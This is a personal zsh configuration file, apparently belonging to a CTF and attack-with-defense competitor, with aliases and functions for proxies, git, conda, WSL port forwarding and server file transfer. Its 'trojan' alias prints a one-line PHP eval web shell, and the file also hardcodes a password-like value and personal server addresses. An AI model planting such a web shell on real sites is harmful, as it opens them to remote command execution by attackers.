export ZSH="$HOME/.oh-my-zsh"
UNAME=$(uname -a)
# iot
alias serial="ls /dev | grep usb"
alias flasher="python3 ~/repos/nodemcu-pyflasher/Main.py &"
# network
alias proxyoff="export https_proxy='' http_proxy='' all_proxy=''"
alias proxyon="export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890"
alias pchain="proxychains4"
alias google="curl google.com"
alias baidu="curl baidu.com"
alias pmod="sudo chmod a+x *" # power mod
alias idax86="cd ~/pwn/server && ./linux_server"
alias idax64="cd ~/pwn/server && ./linux_server64"
alias pwn="code ~/pwn"
alias update="cd ~/maintain && git pull && sudo ln -s ~/maintain/tools/* /usr/local/bin"
alias ggg="gaa && gcmsg '..' && gp"
alias gitback="git reset . && git checkout . && git clean -df" # git back (to origin)
alias cae="conda activate"
alias cde="conda deactivate"
alias sizeof="du -sh" 
alias ipip='echo "public IP addr: $(curl -s http://myip.ipip.net)"'
# hacker
alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
# awd
server="ybw@love4cry.cn"
port=22222
alias pass="echo '0e9521b8817afabe993efe5e42b53156' | copy && echo pass_copied."
function push-keysh(){
  curl -fsSL love4cry.cn/key.sh -o key.sh
  scp -P $port key.sh $server:~/key.sh
  rm key.sh
}
function push-file(){
  echo "from [$1] to server:[$2]"
  if [ -d $1 ]; then scp -P $port -r $1 $server:$2;
    else scp -P $port $1 $server:$2;
  fi
}
function dump-file(){
  echo "from server:[$1] to [$2]"
  if [ -d $2 ]; then scp -P $port -r $server:$1 $2;
    else scp -P $port $server:$1 $2;
  fi
}
function dump-server(){
  echo "ssh remote command..."
  ssh -p $port $server "tar -Pczvf ~/dumped.tgz /var/www/html"
  echo "downloading..."
  scp -P $port $server:~/dumped.tgz .
}
# awd over

function ipof(){
  ping $1 -c 1 | sed -n "1p" | cut -d '(' -f2|cut -d ')' -f1;
}
function killport(){
  kill -9 $(lsof -i:$1 | sed -n "2p" | cut -d " " -f 2)
}
gsed_fail=$(which gsed | grep "found")
if [ $gsed_fail ];then sed=sed;else sed=gsed;fi
function aoc(){
  # add if exist else change (add or change)
  # 3args: "keyword" "context... keyword" file_location
  line=$(cat -n $3| grep -w $1 | awk -F" " '{print $1}')
  if [ $line ]; then
    sudo $sed -i "$line c\\$2" $3             # change
  else
    sudo chmod a+w $3 && sudo echo "$2" >> $3 # add
  fi
}
if [[ $UNAME =~ "Darwin" ]]; then
  __conda="/opt/homebrew/Caskroom/miniconda/base"
  echo "U are using Mac! I know."
  alias pd="prlctl start"
  alias burp="cd ~/Desktop/BurpSuite2020.12 && nohup ./BURP.sh > /dev/null &"
  alias sed="gsed"
  alias wifi='/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport'
  alias code-wsl-pwn="code --remote ssh-remote+wsl /home/ybw/pwn"
  function cpu_host(){
    # set host for {cpu}(my windows)
    sudo gsed -i "s/.*cpu/$1 cpu/g" /etc/hosts;
  }
  function cpu_alive(){
    a=$(ping $cpu_ip -c 1 -t 1 | grep "1 packets received")
    if [[ $a ]]; then echo "cpu alive";fi
  }
  function cpu_host_update(){
    # when connect to known wiki: (test cpu alive)?(set host):(set pub ipv4 host)
    wifi_name=$(wifi -I| awk -F: '/ SSID/{print $2}' | sed 's/^[ \t]*//g')
    echo -n "current wifi: $wifi_name | "
    if   [ $wifi_name = "Neri" ]; then
      cpu_ip="192.168.2.249"
    elif [ $wifi_name = "Redmilk" ]; then
      cpu_ip="192.168.43.113"
    else  cpu_ip="47.110.233.7";fi

    if [[ -z $(cpu_alive) ]]; then cpu_ip="47.110.233.7"; echo -n "cpu not alive | ";fi
    cpu_host $cpu_ip
    echo "host {cpu} updated"
  }
  function push-wsl(){
    scp -P 22222 $1 ybw@cpu:~/pwn/target
    scp -P 22222 $1 ybw@cpu:/mnt/c/Users/27564/Desktop/pwnfiles
  }
  cpu_host_update
elif [[ $UNAME =~ "WSL2" ]]; then
  __conda="$HOME/.miniconda"
  user="/mnt/c/Users/27564"
  desktop="$user/Desktop"
  downloads="$user/Downloads"
  echo "U are using WSL2! I know."
  export PATH=/mnt/c/Windows/System32:$PATH
  alias ggg="gaa && gcmsg '..' && /mnt/c/Program\ Files/Git/cmd/git.exe push"
  alias pwncp="cp $desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
  win_ip=$(ipconfig.exe | grep -a 192.168 | sed "/\.1.$/d"| cut -d ":" -f 2|sed "s/[[:space:]]//g")
  function pfd2win(){
    # port forward to windows
    netsh.exe interface portproxy reset > /dev/null
    netsh.exe interface portproxy add v4tov4 listenaddress=$win_ip listenport=22222 connectaddress=wsl.local connectport=22 > /dev/null
    netsh.exe interface portproxy add v4tov4 listenaddress=$win_ip listenport=23946 connectaddress=wsl.local connectport=23946 > /dev/null
  }
  function wsl_hosts(){
    # 把wsl的ip添加到windows的host里面
    hosts="/mnt/c/Windows/System32/drivers/etc/hosts"
    ip=$(ip add | grep inet | grep eth0 | awk -F" " '{print $2}' | cut -d"/" -f 1)
    echo -n "wsl ip: $ip | "
    aoc "wsl.local" "$ip wsl.local" "$hosts"
    # 把win的ip加入到wsl的host里面，如果局域网ip变了就重新进行端口转发
    hosts="/etc/hosts"
    echo -n "win ip: $win_ip | "
    win_ip_not_change=$(cat $hosts | grep "$win_ip win.local")
    if [ $win_ip_not_change ]; then 
      echo "not changed."
    else
      echo "Forwarding..."
      aoc "win.local" "$win_ip win.local" "$hosts"
      pfd2win
    fi
  }
  function load(){
    if [[ $(service $1 status | grep not) ]];then sudo service $1 start;echo "$1 just started";else echo "$1 is already running";fi
  }
  wsl_hosts
  load ssh
  ~/npc.sh # start npc service if it's not running
elif [[ $UNAME =~ "Android" ]]; then
  echo "U are using Android! I know"
  sshd

else
  __conda="$HOME/.miniconda"
  alias clash="~/clash/clash -d ~/clash/ > /dev/null 2>&1 &"
fi

# key bindings
bindkey \^U backward-kill-line

if [ -e "$ZSH/themes/ybw-ys.zsh-theme" ]; then ZSH_THEME="ybw-ys"; else ZSH_THEME="ys"; fi


plugins=(git
gitignore
osx
cp
gitignore
colored-man-pages
extract
sudo
zsh-autosuggestions
zsh-syntax-highlighting
autojump
)
	
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#ff00ff,bg=cyan,bold,underline"

[[ -s $HOME/.autojump/etc/profile.d/autojump.sh ]] && source $HOME/.autojump/etc/profile.d/autojump.sh
autoload -U compinit && compinit -u
source $ZSH/oh-my-zsh.sh
# . "$HOME/.acme.sh/acme.sh.env"

function conda_init(){
  # >>> conda initialize >>>
  # !! Contents within this block are managed by 'conda init' !!
  if [ -d $__conda -a $__conda ]; then
    __conda_setup="$('$__conda/bin/conda' 'shell.zsh' 'hook' 2> /dev/null)"
    if [ $? -eq 0 ]; then
        eval "$__conda_setup"
    else
        if [ -f "$__conda/etc/profile.d/conda.sh" ]; then
            . "$__conda/etc/profile.d/conda.sh"
        else
            export PATH="$__conda/bin:$PATH"
        fi
    fi
  fi
  unset __conda_setup
  # <<< conda initialize <<<
}

function nvm_init(){
  # >>> nvm initialize >>>
  if [ -d "$HOME/.nvm" ]; then
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
    [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
  fi
  # <<< nvm initialize <<<
}

export PATH=$HOME/pwn/tools:$PATH
